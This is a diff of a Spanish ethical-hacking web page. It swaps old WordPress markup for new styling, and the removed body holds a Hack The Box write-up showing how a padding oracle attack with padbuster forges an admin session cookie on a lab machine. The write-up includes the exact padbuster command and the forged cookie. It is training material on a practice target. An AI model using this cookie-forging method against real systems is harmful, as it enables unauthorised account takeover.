auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}body{background: linear-gradient(180deg, #4B6CB7 0%, #182848 100%);background-color: var(--wp--preset--color--background);color: var(--wp--preset--color--foreground);font-family: var(--wp--preset--font-family--recursive);font-size: var(--wp--preset--font-size--medium);font-weight: 500;line-height: var(--wp--custom--typography--line-height--body);--wp--style--root--padding-top: 0;--wp--style--root--padding-right: var(--wp--preset--spacing--40);--wp--style--root--padding-bottom: 0;--wp--style--root--padding-left: var(--wp--preset--spacing--40);}a:where(:not(.wp-element-button)){color: inherit;text-decoration: underline;}a:where(:not(.wp-element-button)):hover{text-decoration: none;}a:where(:not(.wp-element-button)):focus{text-decoration: none;}h1, h2, h3, h4, h5, h6{color: #F2C94C;font-weight: 700;line-height: var(--wp--custom--typography--line-height--headings);margin-top: 1.25em;margin-bottom: .75em;}h1{font-size: var(--wp--preset--font-size--heading-1);}h2{font-size: var(--wp--preset--font-size--heading-2);}h3{font-size: var(--wp--preset--font-size--heading-3);}h4{font-size: var(--wp--preset--font-size--heading-4);}h5{font-size: var(--wp--preset--font-size--heading-5);}h6{font-size: var(--wp--preset--font-size--heading-6);}.wp-element-button, .wp-block-button__link{background-color: #4B6CB7;border-width: 0;color: var(--wp--preset--color--foreground);font-family: inherit;font-size: inherit;line-height: var(--wp--custom--typography--line-height--body);padding: calc(0.667em + 2px) calc(1.333em + 2px);text-decoration: none;}.wp-element-caption, .wp-block-audio figcaption, .wp-block-embed figcaption, .wp-block-gallery figcaption, .wp-block-image figcaption, .wp-block-table figcaption, .wp-block-video figcaption{color: inherit;font-size: var(--wp--preset--font-size--small);margin-bottom: 0;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-foreground-color{color: var(--wp--preset--color--foreground) !important;}.has-background-color{color: var(--wp--preset--color--background) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-foreground-background-color{background-color: var(--wp--preset--color--foreground) !important;}.has-background-background-color{background-color: var(--wp--preset--color--background) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-foreground-border-color{border-color: var(--wp--preset--color--foreground) !important;}.has-background-border-color{border-color: var(--wp--preset--color--background) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-tiny-font-size{font-size: var(--wp--preset--font-size--tiny) !important;}.has-extra-large-font-size{font-size: var(--wp--preset--font-size--extra-large) !important;}.has-huge-font-size{font-size: var(--wp--preset--font-size--huge) !important;}.has-heading-1-font-size{font-size: var(--wp--preset--font-size--heading-1) !important;}.has-heading-2-font-size{font-size: var(--wp--preset--font-size--heading-2) !important;}.has-heading-3-font-size{font-size: var(--wp--preset--font-size--heading-3) !important;}.has-heading-4-font-size{font-size: var(--wp--preset--font-size--heading-4) !important;}.has-heading-5-font-size{font-size: var(--wp--preset--font-size--heading-5) !important;}.has-heading-6-font-size{font-size: var(--wp--preset--font-size--heading-6) !important;}.has-bitter-font-family{font-family: var(--wp--preset--font-family--bitter) !important;}.has-dancing-script-font-family{font-family: var(--wp--preset--font-family--dancing-script) !important;}.has-edu-qld-beginner-font-family{font-family: var(--wp--preset--font-family--edu-qld-beginner) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-libre-bodoni-font-family{font-family: var(--wp--preset--font-family--libre-bodoni) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-recursive-font-family{font-family: var(--wp--preset--font-family--recursive) !important;}.has-red-hat-mono-font-family{font-family: var(--wp--preset--font-family--red-hat-mono) !important;}.has-red-hat-text-font-family{font-family: var(--wp--preset--font-family--red-hat-text) !important;}.has-space-grotesk-font-family{font-family: var(--wp--preset--font-family--space-grotesk) !important;}.has-system-sans-serif-font-family{font-family: var(--wp--preset--font-family--system-sans-serif) !important;}.has-system-serif-font-family{font-family: var(--wp--preset--font-family--system-serif) !important;}.has-system-monospace-font-family{font-family: var(--wp--preset--font-family--system-monospace) !important;}</style>
-<style id="core-block-supports-inline-css">.wp-container-core-group-layout-2.wp-container-core-group-layout-2 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-layout-2.wp-container-core-group-layout-2.wp-container-core-group-layout-2.wp-container-core-group-layout-2 > * + *{margin-block-start:var(--wp--preset--spacing--40);margin-block-end:0;}.wp-container-core-group-layout-3.wp-container-core-group-layout-3 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-layout-3.wp-container-core-group-layout-3.wp-container-core-group-layout-3.wp-container-core-group-layout-3 > * + *{margin-block-start:var(--wp--preset--spacing--80);margin-block-end:0;}.wp-container-core-group-layout-4.wp-container-core-group-layout-4 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-group-layout-4.wp-container-core-group-layout-4.wp-container-core-group-layout-4.wp-container-core-group-layout-4 > * + *{margin-block-start:var(--wp--preset--spacing--80);margin-block-end:0;}</style>
-<style id="wp-block-template-skip-link-inline-css">.skip-link.screen-reader-text {
-			border: 0;
-			clip: rect(1px,1px,1px,1px);
-			clip-path: inset(50%);
-			height: 1px;
-			margin: -1px;
-			overflow: hidden;
-			padding: 0;
-			position: absolute !important;
-			width: 1px;
-			word-wrap: normal !important;
-		}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Padding Oracle Attack: manipulación de cookies cifradas, bypass de autenticación y descifrado de datos. Guía técnica completa.">
+    <meta name="keywords" content="padding oracle, CBC, AES, cookies, crypto, bypass, descifrado, vulnerabilidades">
+    <title>Manipulación de Cookies - Padding Oracle Attack | HackingUsef</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #00ff88;
+            --secondary-color: #ff6b35;
+            --accent-color: #7c3aed;
+            --dark-bg: #0a0a0a;
+            --darker-bg: #000000;
+            --card-bg: #1a1a1a;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border-color: #333333;
+            --code-bg: #1e1e1e;
+            --gradient-primary: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
+        }
 
-		.skip-link.screen-reader-text:focus {
-			background-color: #eee;
-			clip: auto !important;
-			clip-path: none;
-			color: #444;
-			display: block;
-			font-size: 1em;
-			height: auto;
-			left: 5px;
-			line-height: normal;
-			padding: 15px 23px 14px;
-			text-decoration: none;
-			top: 5px;
-			width: auto;
-			z-index: 100000;
-		}</style>
-<link rel="stylesheet" id="oaknut-styles-css" href="https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/style.css?ver=1.0.1" media="all">
-<link rel="https://api.w.org/" href="https://usefdoybenz.github.io/ethicalhacking/wp-json/">
-<link rel="alternate" type="application/json" href="https://usefdoybenz.github.io/ethicalhacking/wp-json/wp/v2/pages/94">
-<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://usefdoybenz.github.io/ethicalhacking/xmlrpc.php?rsd">
-<meta name="generator" content="WordPress 6.4.3">
-<link rel="canonical" href="https://usefdoybenz.github.io/ethicalhacking/manipulacion-decookieataque-de-padding-oracle/">
-<link rel="shortlink" href="https://usefdoybenz.github.io/ethicalhacking/?p=94">
-<link rel="alternate" type="application/json+oembed" href="https://usefdoybenz.github.io/ethicalhacking/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fusefdoybenz.github.io%2Fethicalhacking%2Fmanipulacion-decookieataque-de-padding-oracle%2F">
-<link rel="alternate" type="text/xml+oembed" href="https://usefdoybenz.github.io/ethicalhacking/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fusefdoybenz.github.io%2Fethicalhacking%2Fmanipulacion-decookieataque-de-padding-oracle%2F#038;format=xml">
-<style id="wp-fonts-local">@font-face{font-family:Bitter;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/bitter.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Bitter;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/bitter.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Dancing Script";font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/dancing-script.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Edu QLD Beginner";font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/edu-qld-beginner.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Figtree;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/figtree.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Inter;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/inter.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Inter;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/inter-italic.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Libre Bodoni";font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/libre-bodoni.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Libre Bodoni";font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/libre-bodoni-italic.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Lora;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/lora.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Lora;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/lora-italic.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:Recursive;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/recursive.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Red Hat Mono";font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/red-hat-mono.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Red Hat Mono";font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/red-hat-mono-italic.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Red Hat Text";font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/red-hat-text.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Red Hat Text";font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/red-hat-text-italic.woff2') format('woff2');font-stretch:normal;}
-@font-face{font-family:"Space Grotesk";font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://usefdoybenz.github.io/ethicalhacking/wp-content/themes/oaknut/assets/fonts/space-grotesk.woff2') format('woff2');font-stretch:normal;}</style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            line-height: 1.7;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .animated-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+        }
+        @keyframes gradientShift { 0% { background-position: 0% 50% } 50% { background-position: 100% 50% } 100% { background-position: 0% 50% } }
+
+        .matrix-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.1; }
+        .matrix-column { position: absolute; color: var(--primary-color); font-family: 'JetBrains Mono', monospace; font-size: 14px; animation: matrixFall linear infinite; }
+        @keyframes matrixFall { 0% { transform: translateY(-100vh); opacity: 1 } 100% { transform: translateY(100vh); opacity: 0 } }
+
+        .container { max-width: 1000px; margin: 0 auto; padding: 2rem; position: relative; z-index: 1; }
+
+        .header { text-align: center; padding: 2rem 0 3rem; border-bottom: 1px solid var(--border-color); margin-bottom: 3rem; }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--primary-color); text-decoration: none; margin-bottom: 2rem; font-size: 0.9rem; transition: all 0.3s ease; }
+        .back-link:hover { transform: translateX(-5px); }
+
+        .logo-container { position: relative; display: inline-block; margin-bottom: 2rem; }
+        .logo-matrix {
+            width: 120px; height: 120px; background: var(--darker-bg); border: 2px solid var(--primary-color); border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 1.8rem; font-weight: 700; color: var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
+        .logo-matrix:hover { transform: scale(1.05) rotateX(5deg); box-shadow: 0 0 50px rgba(0, 255, 136, 0.5); }
+        .logo-matrix::before { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; background: linear-gradient(45deg, var(--primary-color), transparent, var(--primary-color)); border-radius: 12px; z-index: -1; animation: borderGlow 2s ease-in-out infinite alternate; }
+        @keyframes borderGlow { 0% { opacity: .5 } 100% { opacity: 1 } }
+        .logo-text { position: relative; z-index: 2; }
+        .logo-text::after { content: ''; position: absolute; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,.03) 2px, rgba(0,255,136,.03) 4px); animation: scanLines 2s linear infinite; }
+        @keyframes scanLines { 0% { transform: translateY(-100%) } 100% { transform: translateY(100%) } }
+
+        h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 1rem; background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .subtitle { font-size: 1.2rem; color: var(--text-secondary); font-weight: 300; }
+
+        .section { margin-bottom: 4rem; }
+        h2 { color: var(--primary-color); font-size: 1.8rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.8rem; }
+        h3 { color: var(--secondary-color); font-size: 1.4rem; margin: 2rem 0 1rem; }
+        h4 { color: var(--accent-color); font-size: 1.2rem; margin: 1.5rem 0 .8rem; }
+        p { margin-bottom: 1.5rem; color: var(--text-primary); }
+
+        .alert { padding: 1.5rem; border-radius: 8px; margin: 2rem 0; border-left: 4px solid; }
+        .alert-definition { background: rgba(0,255,136,.1); border-color: var(--primary-color); }
+        .alert-danger { background: rgba(231,76,60,.1); border-color: #e74c3c; }
+        .alert-info { background: rgba(124,58,237,.1); border-color: var(--accent-color); }
+        .alert-warning { background: rgba(255,107,53,.1); border-color: var(--secondary-color); }
+
+        .code-block { background: var(--code-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 2rem 0; position: relative; overflow-x: auto; }
+        .code-block code { font-family: 'JetBrains Mono', monospace; color: var(--primary-color); font-size: 0.95rem; white-space: pre; }
+        .code-label { position: absolute; top: -12px; left: 1rem; background: var(--card-bg); color: var(--text-secondary); padding: .3rem .8rem; font-size: .8rem; border-radius: 4px; border: 1px solid var(--border-color); }
+
+        .crypto-flow { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
+        .crypto-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; }
+        .crypto-title { color: var(--secondary-color); font-size: 1.1rem; font-weight: 600; margin-bottom: 1rem; }
+
+        .example { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 2rem; margin: 3rem 0; }
+        .example-title { color: var(--secondary-color); font-size: 1.3rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: .5rem; }
+        .machine-info { background: rgba(124,58,237,.1); border: 1px solid var(--accent-color); border-radius: 6px; padding: 1rem; margin: 1rem 0; font-size: .9rem; }
+
+        .attack-flow { display: flex; flex-direction: column; gap: 1rem; margin: 2rem 0; }
+        .flow-step { display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--card-bg); border-radius: 8px; border-left: 4px solid var(--primary-color); }
+        .flow-number { background: var(--primary-color); color: var(--dark-bg); width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: .9rem; }
+        .flow-content { flex: 1; }
+        .flow-title { color: var(--primary-color); font-weight: 600; margin-bottom: .3rem; }
+        .flow-desc { color: var(--text-secondary); font-size: .9rem; }
+
+        ul { margin-left: 1.5rem; margin-bottom: 1.5rem; }
+        li { margin-bottom: .5rem; color: var(--text-primary); }
+
+        .footer { text-align: center; padding: 3rem 0 2rem; border-top: 1px solid var(--border-color); margin-top: 4rem; color: var(--text-muted); }
+
+        @media (max-width: 768px) {
+            .container { padding: 1rem; }
+            h1 { font-size: 2.2rem; }
+            .logo-matrix { width: 100px; height: 100px; font-size: 1.5rem; }
+            .crypto-flow { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
 
-<body class="page-template-default page page-id-94 wp-embed-responsive">
-
-<div class="wp-site-blocks">
-<header class="alignfull site-header wp-block-template-part">
-<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--40);padding-right:0;padding-bottom:var(--wp--preset--spacing--80);padding-left:0">
-	<h1 class="has-text-align-center wp-block-site-title has-heading-4-font-size"><a href="https://usefdoybenz.github.io/ethicalhacking" target="_self" rel="home">Hacking Usef</a></h1>
-</div>
-</header>
-
-
-<main class="wp-block-group is-layout-flow wp-container-core-group-layout-4 wp-block-group-is-layout-flow">
-	
-	<div class="wp-block-group has-global-padding is-layout-constrained wp-container-core-group-layout-2 wp-block-group-is-layout-constrained">
-		
-
-		
-	</div>
-	
-
-	
-	<div class="wp-block-query is-layout-flow wp-block-query-is-layout-flow">
-		<ul class="wp-block-post-template is-layout-flow wp-block-post-template-is-layout-flow"><li class="wp-block-post post-94 page type-page status-publish hentry">
-		
-		<div class="wp-block-group has-global-padding is-layout-constrained wp-container-core-group-layout-3 wp-block-group-is-layout-constrained" style="padding-top:0;padding-bottom:var(--wp--preset--spacing--80)">
-			<h2 class="has-text-align-center wp-block-post-title"><a href="https://usefdoybenz.github.io/ethicalhacking/manipulacion-decookieataque-de-padding-oracle/" target="_self">Manipulación de Cookie (ataque de Padding Oracle)</a></h2>
-
-			
-
-			<div class="entry-content wp-block-post-content is-layout-flow wp-block-post-content-is-layout-flow">
-<p>Definición:</p>
-
-
-
-<p>Un «Padding Oracle» es una vulnerabilidad criptográfica que se aprovecha al manipular el relleno (padding) en mensajes cifrados. Este tipo de ataque suele centrarse en sistemas que utilizan cifrado de bloques en modos como CBC (Cipher Block Chaining). El atacante intenta deducir información sensible al analizar las respuestas del sistema (oracle) a errores de relleno en los mensajes cifrados.</p>
-
-
-
-<p>PadBuster es una herramienta de prueba de penetración utilizada para llevar a cabo ataques de Padding Oracle en aplicaciones web que utilizan cifrado en bloques, utilizando esta técnica se puede manipular una cookie con el objetivo de conocer el patrón de  cifrado de la misma  y obtener otra cookie que nos permita acceder a la sesión de un usuario no autorizado.</p>
-
-
-
-<p>Para esta técnica se va a emplear la máquina Lazy de la plataforma de Hack The Box (10.10.10.18).</p>
-
-
-
-<p>El usuario admin de la máquina tiene privilegios, pero como no conocemos la contraseña vamos a proceder a realizar un ataque con la herramienta Padbuster  y obtener su cookie de sesión.</p>
-
-
-
-<p>Primero debemos conocer la cookie de un usuario normal, en este caso el usuario se llama tester123 : </p>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img fetchpriority="high" decoding="async" width="809" height="415" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-10.png" alt="" class="wp-image-95" style="width:882px;height:auto"></figure>
-
-
-
-<p>Utilizando la herramienta de desarrollo del propio navegador podemos visualizar la cookie del usuario tester123 : </p>
-
-
-
-<p>b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5</p>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img decoding="async" width="1914" height="395" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-12.png" alt="" class="wp-image-97" style="width:887px;height:auto"></figure>
-
-
-
-<p>A continuación ejecutamos la herramienta padbuster que apunta al sitio web y emplea la cookie para analizar el patrón de cifrado, durante esta primera fase será necesario seleccionar las opciones recomendadas:</p>
-
-
-
-<p>padbuster http://10.10.10.18/index.php &#8216;b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5&#8217; 8 -cookies &#8216;auth=b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5&#8217;</p>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img decoding="async" width="1388" height="463" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-13.png" alt="" class="wp-image-98" style="width:893px;height:auto"></figure>
-
-
-
-<p>La primera fase concluye y como podemos observar que el cifrado de bloques que emplea esta herramienta funciona correctamente y nos muestra el valor de la cookie del usuario tester123: user=tester123</p>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="991" height="234" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-14.png" alt="" class="wp-image-99" style="width:894px;height:auto"></figure>
-
-
-
-<p>En la siguiente fase vamos a  emplear de nuevo la herramienta padbuster  pero esta vez siguiendo el patrón de cifrado le vamos a solicitar que nos crea una cookie de sesión  donde se cumpla  user=admin, es decir, obtener la cookie de sesión del usuario administrador:</p>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="900" height="181" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-15.png" alt="" class="wp-image-100" style="width:908px;height:auto"></figure>
-
-
-
-<p>Finalmente la hemos obtenido: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</p>
-
-
-
-<p>A continuación, simplemente la sustituimos  por la cookie del usuario tester123 y eso nos permite convertirnos en usuario administrador:</p>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="1918" height="417" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-18.png" alt="" class="wp-image-103" style="width:914px;height:auto"></figure>
-
-
-
-<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="873" height="330" src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-16.png" alt="" class="wp-image-101" style="width:910px;height:auto"></figure>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-
-
-
-<p></p>
-</div>
-
-			
-			<hr class="wp-block-separator has-alpha-channel-opacity" style="margin-top:var(--wp--preset--spacing--80);margin-bottom:0">
-			
-		</div>
-		
-		</li></ul>
-
-		
-	</div>
-	
-</main>
-
-
-<footer class="alignfull site-footer wp-block-template-part">
-<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--80);padding-bottom:var(--wp--preset--spacing--30)"></div>
-</footer>
-</div>
-<script id="wp-block-template-skip-link-js-after">( function() {
-		var skipLinkTarget = document.querySelector( 'main' ),
-			sibling,
-			skipLinkTargetID,
-			skipLink;
-
-		// Early exit if a skip-link target can't be located.
-		if ( ! skipLinkTarget ) {
-			return;
-		}
-
-		/*
-		 * Get the site wrapper.
-		 * The skip-link will be injected in the beginning of it.
-		 */
